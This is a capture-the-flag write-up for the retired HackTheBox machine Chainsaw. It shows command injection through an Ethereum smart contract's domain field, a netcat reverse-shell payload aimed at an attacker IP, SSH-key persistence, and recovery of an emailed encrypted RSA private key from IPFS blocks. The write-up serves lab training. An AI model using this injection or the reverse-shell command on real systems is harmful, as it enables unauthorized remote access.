**Chainsaw** is a retired vulnerable VM from Hack. This box is about Solidity, Ethereum Blockchain and IPFS Exploitation. 

#### Enumeration

To begin the enumeration process, a **TCP/UDP** port scan was run against the target using nmap. The purpose of scan is to quickly determine which ports are open and which services are running. 

###### OS Information
Based on the Apache version, it looks like we are dealing with Xenial / Ubuntu 16.04 based system.

###### Open Ports and Services :
In addition to usual ports

+ Port 21 : FTP Server which allows anonymous login
+ Port 22 : SSH Server
+ Port 9810 : A webserver ?

###### Anonymous FTP:

```python

➜  chainsaw ftp 10.10.10.142
Connected to 10.10.10.142.
220 (vsFTPd 3.0.3)
Name (10.10.10.142:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001        23828 Dec 05  2018 WeaponizedPing.json
-rw-r--r--    1 1001     1001          243 Dec 12  2018 WeaponizedPing.sol
-rw-r--r--    1 1001     1001           44 May 31 16:20 address.txt
226 Directory send OK.
ftp> mget *
```
We have got three interesting files from FTP server, after a bit of researching i found out these files are belong to a etherum smart contract.

#### What is a Smart Contract ?

> A smart contract is an agreement between two people in the form of computer code. They run on the blockchain, so they are stored on a public database and cannot be changed.

#### Analyzing Smart Contract

WeaponizedPing.json - A compiled Solidity smart-contract in JSON format
WeaponizedPing.sol - .sol extention means its an Ethereum smart-sontract written in Solidity
address.txt - Possibly an address on a blockchain where the contract is been deployed.



**Lets take a look at the solidity code:**
WeaponizedPing.sol

```python
pragma solidity ^0.4.24;

contract WeaponizedPing
{
  string store = "google.com";

  function getDomain() public view returns (string)
  {
      return store;
  }

  function setDomain(string _value) public
  {
      store = _value;
  }
}
```

+ Smart contracts is written in Solidity, which is a contract-oriented, high-level language for implementing smart contracts.
+ A getDomain function and setDomain which accepts a string_value. 
+ The getDomain function  retrieves the current value of the domain string
+ setDomain set a value for the domain string

##### Initial Foothold:

After some enumeration and reading about etherum blockchain i was able to determine the service running in tcp port 9810 was Ganache CLI.

> Ganache (formally known as testrpc) is an Ethereum implementation written in Node.js meant for testing purposes while developing dapps locally.

Ganache CLI uses ethereumjs to simulate full client behavior and make developing Ethereum applications faster, easier, and safer. It also includes all popular RPC functions and features (like events) and can be run deterministically to make development a breez.

To interact with the Ethereum blockchain, i will be using python library web3.py. To interact with the Smart Contract, we need:

+ the address to identify the contract
+ Application Binary Interface of the contract

To test this vulnerability we can use setDomain() function and set the domain to our localhost  and then call getDomain(). This will make the contract ping localhost, if ping successful we know we got remote code execution.

###### Building Python Script
To test our theory So let’s start building a python script to interact with this contract.
```python

from web3 import Web3
import json
```
+ web3.Web3 intract with the blockchain
+ json to load the WeaponizedPing.json



My final exploit is shown below

#### Initial Shell

Now that we know we can do RCE, lets replace the ping with our payload.


Capturing packets:
```python

➜  chainsaw tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
14:11:28.037126 IP 10.10.10.142 > 10.10.14.35: ICMP echo request, id 18359, seq 1, length 64
14:11:28.037206 IP 10.10.14.35 > 10.10.10.142: ICMP echo reply, id 18359, seq 1, length 64
```

###### Running the exploit

> python3 chainsaw.py '; nc 10.10.14.35 4444 -e /bin/bash'

###### Waiting for reverse shell

```python

➜  chainsaw nc -lvnp 4444                                           
listening on [any] 4444 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.10.142] 40676
id
uid=1001(administrator) gid=1001(administrator) groups=1001(administrator)
python -c 'import pty; pty.spawn("/bin/bash")'
administrator@chainsaw:/opt/WeaponizedPing$ 

```
Before doing anything i upgraded the shell to a fully tty. After that i quickly searched for the user.txt but it is not here, so back to further enumeration. 

###### Enumeration:
I dropped my SSH public key into the /home/administrator/.ssh/authorized_keys file so i can get into the system easily, without having to run the exploit again and again.

Checked to see if their is anyother users in the system, i can see user bobby which we might have to escalate to. 

```python

administrator@chainsaw:/home$ awk -F: '$3 >= 1000 {print}' /etc/passwd
awk -F: '$3 >= 1000 {print}' /etc/passwd
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
bobby:x:1000:1000:Bobby Axelrod:/home/bobby:/bin/bash
administrator:x:1001:1001:Chuck Rhoades,,,,IT Administrator:/home/administrator:/bin/bash
administrator@chainsaw:/home$ 
```

Interesting files in maintain folder

```python

administrator@chainsaw:~/maintain$ cd pub && ls -al
total 28
drwxrwxr-x 2 administrator administrator 4096 Dec 13  2018 .
drwxr-x--- 3 administrator administrator 4096 Dec 13  2018 ..
-rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 arti.key.pub
-rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 bobby.key.pub
-rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 bryan.key.pub
-rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 lara.key.pub
-rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 wendy.key.pub
```
In pub folder we can see public key of bobby.

```python

administrator@chainsaw:/home/administrator/maintain$ cat gen.py 
#!/usr/bin/python
from Crypto.PublicKey import RSA
from os import chmod
import getpass

def generate(username,password):
        key = RSA.generate(2048)
        pubkey = key.publickey()

        pub = pubkey.exportKey('OpenSSH')
        priv = key.exportKey('PEM',password,pkcs=1)

        filename = "{}.key".format(username)

        with open(filename, 'w') as file:
                chmod(filename, 0600)
                file.write(priv)
                file.close()

        with open("{}.pub".format(filename), 'w') as file:
                file.write(pub)
                file.close()

        # TODO: Distribute keys via ProtonMail

if __name__ == "__main__":
        while True:
                username = raw_input("User: ")
                password = getpass.getpass()
                generate(username,password)
```
This comment "distributing keys over Protonmail" is a interesting one. This script generate the RSA keys and sent it via proton mail. Lets look for these keys, we might find the keys stored in somewhere.


###### InterPlanetary File System

> The InterPlanetary File System is a protocol and peer-to-peer network for storing and sharing data in a distributed file system. IPFS uses content-addressing to uniquely identify each file in a global namespace connecting all computing devices.

```python

administrator@chainsaw:/home/administrator$ ls -la
ls -la
total 104
drwxr-x--- 8 administrator administrator  4096 Dec 20  2018 .
drwxr-xr-x 4 root          root           4096 Dec 12  2018 ..
lrwxrwxrwx 1 administrator administrator     9 Dec 12  2018 .bash_history -> /dev/null
-rw-r----- 1 administrator administrator   220 Dec 12  2018 .bash_logout
-rw-r----- 1 administrator administrator  3771 Dec 12  2018 .bashrc
-rw-r----- 1 administrator administrator   220 Dec 20  2018 chainsaw-emp.csv
drwxrwxr-x 5 administrator administrator  4096 Jan 23  2019 .ipfs
drwxr-x--- 3 administrator administrator  4096 Dec 12  2018 .local
drwxr-x--- 3 administrator administrator  4096 Dec 13  2018 maintain
drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .ngrok2
-rw-r----- 1 administrator administrator   807 Dec 12  2018 .profile
drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .ssh
drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .swt
-rw-r----- 1 administrator administrator  1739 Dec 12  2018 .tmux.conf
-rw-r----- 1 administrator administrator 45152 Dec 12  2018 .zcompdump
lrwxrwxrwx 1 administrator administrator     9 Dec 12  2018 .zsh_history -> /dev/null
-rw-r----- 1 administrator administrator  1295 Dec 12  2018 .zshrc
administrator@chainsaw:/home/administrator$ 

```
Content of IPFS folder 

```python

administrator@chainsaw:/home/administrator/.ipfs$ ls -la
ls -la
total 36
drwxrwxr-x  5 administrator administrator 4096 Jun  9 18:38 .
drwxr-x---  8 administrator administrator 4096 Dec 20  2018 ..
drwxr-xr-x 41 administrator administrator 4096 Jun  9 18:38 blocks
-rw-rw----  1 administrator administrator 5273 Dec 13  2018 config
drwxr-xr-x  2 administrator administrator 4096 Jun  9 18:38 datastore
-rw-------  1 administrator administrator  190 Dec 13  2018 datastore_spec
drwx------  2 administrator administrator 4096 Dec 13  2018 keystore
-rw-r--r--  1 administrator administrator    0 Jun  9 18:38 repo.lock
-rw-r--r--  1 administrator administrator    2 Dec 13  2018 version
administrator@chainsaw:/home/administrator/.ipfs$ 
```
I searched for files containing bobby inside ipfs folder grep -iRl bobby

```python


administrator@chainsaw:/home/administrator/.ipfs$ grep -iRl bobby
grep -iRl bobby
blocks/SG/CIQBGBBWXJ4N54A5BUNC7WYVUQNXLEQN67SNFTAPGUMYTYB2UAC4SGI.data
blocks/JL/CIQKWHQP7PFXWUXO6CSIFQMFWW4CTR23WJEFINRLPRC6UAP2ZM5EJLY.data
blocks/OY/CIQG3CRQFZCTNW7GKEFLYX5KSQD4SZUO2SMZHX6ZPT57JIR6WSNTOYQ.data
blocks/SP/CIQJWFQFWYW5QEXAELBZ5WBEDCJBZ2RSPCHVGDOXQ6FM67VBWKVTSPI.data
administrator@chainsaw:/home/administrator/.ipfs$ 
```
Got few files that might contain the data. lets check.

```python

administrator@chainsaw:/home/administrator/.ipfs$ cat blocks/OY/CIQG3CRQFZCTNW7GKEFLYX5KSQD4SZUO2SMZHX6ZPT57JIR6WSNTOYQ.data
<ZCTNW7GKEFLYX5KSQD4SZUO2SMZHX6ZPT57JIR6WSNTOYQ.data

��$X-Pm-Origin: internal
X-Pm-Content-Encryption: end-to-end
Subject: Ubuntu Server Private RSA Key
From: IT Department <chainsaw_admin@protonmail.ch>
Date: Thu, 13 Dec 2018 19:28:54 +0000
Mime-Version: 1.0
Content-Type: multipart/mixed;boundary=---------------------d296272d7cb599bff2a1ddf6d6374d93
To: bobbyaxelrod600@protonmail.ch <bobbyaxelrod600@protonmail.ch>
X-Attached: bobby.key.enc
Message-Id: <zctvLwVo5mWy8NaBt3CLKmxVckb-cX7OCfxUYfHsU2af1NH4krcpgGz7h-PorsytjrT3sA9Ju8WNuWaRAnbE0CY0nIk2WmuwOvOnmRhHPoU=@protonmail.ch>
Received: from mail.protonmail.ch by mail.protonmail.ch; Thu, 13 Dec 2018 14:28:58 -0500
X-Original-To: bobbyaxelrod600@protonmail.ch
Return-Path: <chainsaw_admin@protonmail.ch>
Delivered-To: bobbyaxelrod600@protonmail.ch

-----------------------d296272d7cb599bff2a1ddf6d6374d93
Content-Type: multipart/related;boundary=---------------------ffced83f318ffbd54e80374f045d2451

-----------------------ffced83f318ffbd54e80374f045d2451
Content-Type: text/html;charset=utf-8
Content-Transfer-Encoding: base64

PGRpdj5Cb2JieSw8YnI+PC9kaXY+PGRpdj48YnI+PC9kaXY+PGRpdj5JIGFtIHdyaXRpbmcgdGhp
cyBlbWFpbCBpbiByZWZlcmVuY2UgdG8gdGhlIG1ldGhvZCBvbiBob3cgd2UgYWNjZXNzIG91ciBM
aW51eCBzZXJ2ZXIgZnJvbSBub3cgb24uIER1ZSB0byBzZWN1cml0eSByZWFzb25zLCB3ZSBoYXZl
IGRpc2FibGVkIFNTSCBwYXNzd29yZCBhdXRoZW50aWNhdGlvbiBhbmQgaW5zdGVhZCB3ZSB3aWxs
IHVzZSBwcml2YXRlL3B1YmxpYyBrZXkgcGFpcnMgdG8gc2VjdXJlbHkgYW5kIGNvbnZlbmllbnRs
eSBhY2Nlc3MgdGhlIG1hY2hpbmUuPGJyPjwvZGl2PjxkaXY+PGJyPjwvZGl2PjxkaXY+QXR0YWNo
ZWQgeW91IHdpbGwgZmluZCB5b3VyIHBlcnNvbmFsIGVuY3J5cHRlZCBwcml2YXRlIGtleS4gUGxl
YXNlIGFzayZuYnNwO3JlY2VwdGlvbiBkZXNrIGZvciB5b3VyIHBhc3N3b3JkLCB0aGVyZWZvcmUg
YmUgc3VyZSB0byBicmluZyB5b3VyIHZhbGlkIElEIGFzIGFsd2F5cy48YnI+PC9kaXY+PGRpdj48
YnI+PC9kaXY+PGRpdj5TaW5jZXJlbHksPGJyPjwvZGl2PjxkaXY+SVQgQWRtaW5pc3RyYXRpb24g
RGVwYXJ0bWVudDxicj48L2Rpdj4=
```
###### Base64 decoded 

```python


I am writing this email in reference to the method on how we access our Linux server from now on. Due to security reasons, we have disabled SSH password authentication and instead we will use private/public key pairs to securely and conveniently access the machine.<br></div><div><br></div><div>Attached you will find your personal encrypted private key. Please ask&nbsp;reception desk for your password, therefore be sure to bring your valid ID as always.
IT Administration Department
```

###### Base64 decoded RSA key

```python

-----------------------ffced83f318ffbd54e80374f045d2451--
-----------------------d296272d7cb599bff2a1ddf6d6374d93
Content-Type: application/octet-stream; filename="bobby.key.enc"; name="bobby.key.enc"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="bobby.key.enc"; name="bobby.key.enc"

LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRF
Sy1JbmZvOiBERVMtRURFMy1DQkMsNTNEODgxRjI5OUJBODUwMwoKU2VDTll3L0JzWFB5UXExSFJM
RUVLaGlOSVZmdFphZ3pPY2M2NGZmMUlwSm85SWVHN1ovemordjFkQ0lkZWp1awo3a3RRRmN6VGx0
dG5ySWo2bWRCYjZybk42Q3NQMHZiejlOelJCeWcxbzZjU0dkckwyRW1KTi9lU3hENEFXTGN6Cm4z
MkZQWTBWamxJVnJoNHJqaFJlMndQTm9nQWNpQ0htWkdFQjB0Z3YyL2V5eEU2M1ZjUnpyeEpDWWwr
aHZTWjYKZnZzU1g4QTRRcjdyYmY5Zm56NFBJbUlndXJGM1ZoUW1kbEVtekRSVDRtL3BxZjNUbUdB
azkrd3JpcW5rT0RGUQpJKzJJMWNQYjhKUmhMU3ozcHlCM1gvdUdPVG5ZcDRhRXErQVFaMnZFSnoz
RmZYOVNYOWs3ZGQ2S2FadFNBenFpCnc5ODFFUzg1RGs5TlVvOHVMeG5aQXczc0Y3UHo0RXVKMEhw
bzFlWmdZdEt6dkRLcnJ3OHVvNFJDYWR4N0tIUlQKaW5LWGR1SHpuR0ExUVJPelpXN3hFM0hFTDN2
eFI5Z01WOGdKUkhEWkRNSTl4bHc5OVFWd2N4UGNGYTMxQXpWMgp5cDNxN3lsOTU0U0NNT3RpNFJD
M1o0eVVUakRrSGRIUW9FY0dpZUZPV1UraTFvaWo0Y3J4MUxiTzJMdDhuSEs2CkcxQ2NxN2lPb240
UnNUUmxWcnY4bGlJR3J4bmhPWTI5NWU5ZHJsN0JYUHBKcmJ3c284eHhIbFQzMzMzWVU5ZGoKaFFM
TnA1KzJINCtpNm1tVTN0Mm9nVG9QNHNrVmNvcURsQ0MrajZoRE9sNGJwRDl0NlRJSnVyV3htcEdn
TnhlcwpxOE5zQWVudGJzRCt4bDRXNnE1bXVMSlFtai94UXJySGFjRVpER0k4a1d2WkUxaUZtVmtE
L3hCUm53b0daNWh0CkR5aWxMUHBsOVIrRGg3YnkzbFBtOGtmOHRRbkhzcXBSSGNleUJGRnBucTBB
VWRFS2ttMUxSTUxBUFlJTGJsS0cKandyQ3FSdkJLUk1JbDZ0SmlEODdOTTZKQm9ReWRPRWNwbis2
RFUrMkFjdGVqYnVyMGFNNzRJeWVlbnJHS1NTWgpJWk1zZDJrVFNHVXh5OW8veFBLRGtVdy9TRlV5
U21td2lxaUZMNlBhRGd4V1F3SHh0eHZtSE1oTDZjaXROZEl3ClRjT1RTSmN6bVIycEp4a29oTHJI
N1lyUzJhbEtzTTBGcEZ3bWR6MS9YRFNGMkQ3aWJmL1cxbUF4TDVVbUVxTzAKaFVJdVcxZFJGd0hq
TnZhb1NrK2ZyQXA2aWM2SVBZU21kbzhHWVl5OHBYdmNxd2ZScHhZbEFDWnU0RmlpNmhZaQo0V3Bo
VDNaRllEcnc3U3RnSzA0a2JEN1FrUGVOcTlFdjFJbjJuVmR6RkhQSWg2eitmbXBiZ2ZXZ2VsTEhj
MmV0ClNKWTQrNUNFYmtBY1lFVW5QV1k5U1BPSjdxZVU3K2IvZXF6aEtia3BuYmxtaUsxZjNyZU9N
MllVS3k4YWFsZWgKbkpZbWttcjN0M3FHUnpoQUVUY2tjOEhMRTExZEdFK2w0YmE2V0JOdTE1R29F
V0Fzenp0TXVJVjFlbW50OTdvTQpJbW5mb250T1lkd0I2LzJvQ3V5SlRpZjhWdy9XdFdxWk5icGV5
OTcwNGE5bWFwLytiRHFlUVE0MStCOEFDRGJLCldvdnNneVdpL1VwaU1UNm02clgrRlA1RDVFOHpy
WXRubm1xSW83dnhIcXRCV1V4amFoQ2RuQnJrWUZ6bDZLV1IKZ0Z6eDNlVGF0bFpXeXI0a3N2Rm10
b2JZa1pWQVFQQUJXeitnSHB1S2xycWhDOUFOenIvSm4rNVpmRzAybW9GLwplZEwxYnA5SFBSSTQ3
RHl2THd6VDEvNUw5Wno2WSsxTXplbmRUaTNLcnpRL1ljZnI1WUFSdll5TUxiTGpNRXRQClV2SmlZ
NDB1Mm5tVmI2UXFwaXkyenIvYU1saHB1cFpQay94dDhvS2hLQytsOW1nT1RzQVhZakNiVG1MWHpW
clgKMTVVMjEwQmR4RUZVRGNpeE5pd1Rwb0JTNk1meENPWndOLzFadjBtRThFQ0krNDRMY3FWdDN3
PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0=
-----------------------d296272d7cb599bff2a1ddf6d6374d93--
```
And found a mail which contains a base64 encoded RSA key.



